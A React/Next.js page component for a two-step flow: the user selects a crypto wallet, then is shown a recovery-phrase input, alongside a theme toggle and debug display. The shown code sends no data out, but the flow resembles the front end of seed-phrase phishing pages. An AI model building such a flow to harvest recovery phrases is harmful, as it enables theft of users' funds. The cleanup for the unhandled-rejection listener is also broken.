'use client'

import { useState, useEffect } from 'react'
import { useTheme } from '../contexts/ThemeContext'
import WalletSelector from '../components/WalletSelector'
import PhraseInput from '../components/PhraseInput'

export default function Home() {
  const [selectedWallet, setSelectedWallet] = useState(null)
  const [currentStep, setCurrentStep] = useState('wallet-selection')
  const [error, setError] = useState(null)
  const { isDark, toggleTheme } = useTheme()

  // Add error boundary
  useEffect(() => {
    const handleError = (event) => {
      console.error('Global error caught:', event.error)
      setError(event.error.message)
    }

    window.addEventListener('error', handleError)
    window.addEventListener('unhandledrejection', (event) => {
      console.error('Unhandled promise rejection:', event.reason)
      setError(event.reason.message)
    })

    return () => {
      window.removeEventListener('error', handleError)
      window.removeEventListener('unhandledrejection', handleError)
    }
  }, [])

  const handleWalletSelect = (wallet) => {
    try {
      setSelectedWallet(wallet)
      setCurrentStep('phrase-input')
      setError(null) // Clear any previous errors
    } catch (err) {
      console.error('Error selecting wallet:', err)
      setError(err.message)
    }
  }

  const handleBackToWalletSelection = () => {
    try {
      setSelectedWallet(null)
      setCurrentStep('wallet-selection')
      setError(null)
    } catch (err) {
      console.error('Error going back:', err)
      setError(err.message)
    }
  }

  const handleThemeToggle = () => {
    try {
      console.log('Theme toggle clicked! Current theme:', isDark ? 'dark' : 'light')
      toggleTheme()
      // Check if the class was applied
      setTimeout(() => {
        const hasDarkClass = document.documentElement.classList.contains('dark')
        console.log('HTML has dark class after toggle:', hasDarkClass)
        console.log('LocalStorage theme:', localStorage.getItem('theme'))
      }, 100)
    } catch (err) {
      console.error('Error toggling theme:', err)
      setError(err.message)
    }
  }

  // Show error if something went wrong
  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-red-50 to-red-100 dark:from-red-900 dark:to-red-800 p-4 transition-colors duration-300">
        <div className="max-w-2xl mx-auto">
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-xl dark:shadow-2xl p-8 text-center">
            <div className="text-red-500 text-6xl mb-4">⚠️</div>
            <h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-4">Something went wrong</h1>
            <p className="text-gray-600 dark:text-gray-300 mb-6">{error}</p>
            <button
              onClick={() => {
                setError(null)
                setCurrentStep('wallet-selection')
                setSelectedWallet(null)
              }}
              className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <main className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 dark:from-gray-900 dark:to-gray-800 p-4 transition-colors duration-300">
      <div className="max-w-2xl mx-auto">
        {/* Theme Toggle - Made More Prominent */}
        <div className="flex justify-center mb-6">
          <button
            onClick={handleThemeToggle}
            className="flex items-center space-x-3 px-6 py-3 rounded-xl bg-gradient-to-r from-blue-500 to-purple-600 dark:from-purple-500 dark:to-blue-600 text-white font-semibold shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 border-2 border-white dark:border-gray-700"
            title={isDark ? 'Switch to Light Mode' : 'Switch to Dark Mode'}
          >
            {isDark ? (
              <>
                <svg className="w-6 h-6 text-yellow-300" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" clipRule="evenodd" />
                </svg>
                <span className="text-lg">☀️ Light Mode</span>
              </>
            ) : (
              <>
                <svg className="w-6 h-6 text-gray-100" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" />
                </svg>
                <span className="text-lg">🌙 Dark Mode</span>
              </>
            )}
          </button>
        </div>

        {/* Debug Info */}
        <div className="text-center mb-4 text-sm text-gray-600 dark:text-gray-400">
          Current Theme: {isDark ? 'Dark' : 'Light'} | 
          HTML Class: {typeof window !== 'undefined' && document.documentElement.classList.contains('dark') ? 'dark' : 'light'} |
          Storage: {typeof window !== 'undefined' ? localStorage.getItem('theme') || 'none' : 'loading...'}
        </div>

        <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-xl dark:shadow-2xl p-8 transition-colors duration-300">
          {currentStep === 'wallet-selection' ? (
            <WalletSelector onWalletSelect={handleWalletSelect} />
          ) : (
            <PhraseInput 
              selectedWallet={selectedWallet}
              onBack={handleBackToWalletSelection}
            />
          )}
        </div>
      </div>
    </main>
  )
}
